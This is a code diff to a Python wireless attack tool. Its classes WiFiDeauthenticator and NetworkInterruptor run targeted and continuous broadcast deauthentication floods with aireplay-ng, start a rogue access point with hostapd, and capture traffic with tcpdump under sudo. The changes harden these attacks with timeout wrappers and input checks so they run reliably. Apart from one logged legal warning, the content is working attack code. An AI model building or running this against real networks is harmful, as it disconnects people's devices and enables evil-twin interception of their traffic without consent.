@@ -204,6 +204,11 @@ class WiFiDeauthenticator:
             self.logger.error("WiFi scanning is only supported on Linux")
             return []
 
+        try:
+            duration = max(1, int(duration))
+        except (TypeError, ValueError):
+            duration = 10
+
         # Capture files go into a private temp dir -- never a predictable
         # /tmp path. airodump-ng appends its own suffixes to the prefix.
         scan_dir = tempfile.mkdtemp(prefix="shibacuddles_scan_")
@@ -214,9 +219,19 @@ class WiFiDeauthenticator:
                 # the normal path, not an error. Its chatty stdout goes to
                 # DEVNULL -- it would otherwise accumulate in memory for
                 # the whole scan; the networks come from the CSV files.
+                #
+                # ORPHAN BACKSTOP (same pattern as jam_channel): the
+                # `timeout` wrapper, not subprocess.run's kill, is what
+                # guarantees airodump-ng dies. subprocess.run's timeout
+                # kills only the `sudo` parent; the airodump-ng child
+                # would be orphaned and keep capturing (holding the
+                # monitor interface) indefinitely. The wrapper survives
+                # as an orphan itself but still fires on schedule.
                 subprocess.run(
                     [
                         "sudo",
+                        "timeout",
+                        str(duration + 5),
                         "airodump-ng",
                         "-w",
                         scan_prefix,
@@ -228,10 +243,10 @@ class WiFiDeauthenticator:
                     ],
                     stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL,
-                    timeout=duration + 5,
+                    timeout=duration + 15,
                 )
             except subprocess.TimeoutExpired:
-                pass  # expected: airodump-ng runs until we stop it
+                pass  # backstop of the backstop: wrapper should have fired
 
             networks = self._parse_airodump_csv(scan_dir)
             self.logger.info(f"WiFi scan complete: {len(networks)} networks")
@@ -323,10 +338,16 @@ class WiFiDeauthenticator:
                 packet_count = 64
             packet_count = max(1, packet_count)
 
-            # Send deauth frames using aireplay-ng
+            # Send deauth frames using aireplay-ng. The `timeout`
+            # wrapper is the orphan backstop (see scan_nearby_networks):
+            # a finite frame count should finish in seconds, but a
+            # wedged driver can hang aireplay-ng forever, and
+            # subprocess.run's timeout would only kill the sudo parent.
             result = subprocess.run(
                 [
                     "sudo",
+                    "timeout",
+                    "25",
                     "aireplay-ng",
                     "--deauth",
                     str(packet_count),
@@ -382,18 +403,53 @@ class WiFiDeauthenticator:
             self.logger.error("Broadcast deauthentication is only supported on Linux")
             return 0
 
+        # Coerce and floor the duration BEFORE it reaches any timeout
+        # arithmetic (mirrors jam_channel): "--deauth 0" below is
+        # aireplay-ng's CONTINUOUS mode, so the timeout wrapper is the
+        # only thing that ever stops it — and `timeout 0` would DISABLE
+        # that wrapper, while subprocess.run(timeout<=0) expires
+        # instantly and kills only the sudo parent, orphaning an
+        # infinite broadcast deauth.
+        try:
+            duration = int(duration)
+        except (TypeError, ValueError):
+            self.logger.error(
+                f"deauthenticate_all_devices: duration must be an integer, "
+                f"got {duration!r}"
+            )
+            return 0
+        if duration < 1:
+            self.logger.error(
+                f"deauthenticate_all_devices: duration must be at least "
+                f"1 second, got {duration}"
+            )
+            return 0
+
         self.logger.warning(
             f"LEGAL WARNING: Broadcasting deauthentication frames to all "
             f"devices on {ssid}. Ensure you have permission."
         )
 
         try:
-            # Broadcast deauth to all clients
+            # Broadcast deauth to all clients. The `timeout` wrapper is
+            # the orphan backstop (see scan_nearby_networks): it, not
+            # subprocess.run's kill of the sudo parent, is what stops
+            # the continuous "--deauth 0" stream after `duration`.
             subprocess.run(
-                ["sudo", "aireplay-ng", "--deauth", "0", "-a", gateway_mac, interface],
+                [
+                    "sudo",
+                    "timeout",
+                    str(duration),
+                    "aireplay-ng",
+                    "--deauth",
+                    "0",
+                    "-a",
+                    gateway_mac,
+                    interface,
+                ],
                 capture_output=True,
                 text=True,
-                timeout=duration,
+                timeout=duration + 10,
             )
 
             self.logger.info(f"Broadcast deauthentication completed on {ssid}")
@@ -449,10 +505,15 @@ class WiFiDeauthenticator:
                 atexit_handle = atexit.register(_silent_unlink, hostapd_conf)
                 try:
                     try:
+                        # `timeout` wrapper = orphan backstop (see
+                        # scan_nearby_networks): without it, the
+                        # subprocess.run timeout kills only the sudo
+                        # parent and the rogue AP keeps broadcasting
+                        # with the generated passphrase indefinitely.
                         result = subprocess.run(
-                            ["sudo", "hostapd", hostapd_conf],
+                            ["sudo", "timeout", "60", "hostapd", hostapd_conf],
                             capture_output=True,
-                            timeout=60,
+                            timeout=75,
                         )
                     except subprocess.TimeoutExpired:
                         # hostapd runs in the foreground, so the timeout
@@ -462,7 +523,11 @@ class WiFiDeauthenticator:
                             f"Rogue AP '{ssid}' ran for the full 60s window"
                         )
                         return True
-                    return result.returncode == 0
+                    # 124 is the timeout wrapper's exit code: hostapd
+                    # stayed up for the full 60s window and the wrapper
+                    # ended it — the same success case as the
+                    # TimeoutExpired branch above.
+                    return result.returncode in (0, 124)
                 finally:
                     atexit.unregister(atexit_handle)
             finally:
@@ -650,6 +715,24 @@ class NetworkInterruptor:
             total_packets is 0. The capture itself runs; only the parsing
             is a stub.
         """
+        # Coerce and floor the duration first (mirrors jam_channel):
+        # it feeds the `timeout` wrapper below, where 0 would DISABLE
+        # the backstop entirely.
+        try:
+            duration = int(duration)
+        except (TypeError, ValueError):
+            self.logger.error(
+                f"analyze_traffic_patterns: duration must be an integer, "
+                f"got {duration!r}"
+            )
+            return {}
+        if duration < 1:
+            self.logger.error(
+                f"analyze_traffic_patterns: duration must be at least "
+                f"1 second, got {duration}"
+            )
+            return {}
+
         # Private temp file, never a predictable /tmp path: tcpdump runs
         # under sudo, and a pre-planted symlink at a fixed path would let
         # another user redirect the capture output.
@@ -659,11 +742,22 @@ class NetworkInterruptor:
             # Use tcpdump to capture traffic. `-c 1000` is an upper bound,
             # not a promise: on a quiet network tcpdump never reaches it
             # before the timeout ends the capture.
+            #
+            # Orphan backstop (see scan_nearby_networks): on Linux the
+            # `timeout` wrapper guarantees tcpdump dies at the end of
+            # the window even if this process is killed first — the
+            # subprocess.run timeout alone only kills the sudo parent.
+            # (GNU timeout is not part of stock macOS, so the wrapper is
+            # Linux-only; macOS keeps the run-timeout behaviour.)
+            cmd = ["sudo"]
+            if platform.system().lower() == "linux":
+                cmd += ["timeout", str(duration)]
+            cmd += ["tcpdump", "-i", interface, "-c", "1000", "-w", pcap_path]
             try:
                 subprocess.run(
-                    ["sudo", "tcpdump", "-i", interface, "-c", "1000", "-w", pcap_path],
+                    cmd,
                     capture_output=True,
-                    timeout=duration,
+                    timeout=duration + 10,
                 )
             except subprocess.TimeoutExpired:
                 # Expected on quiet networks: the capture window closed
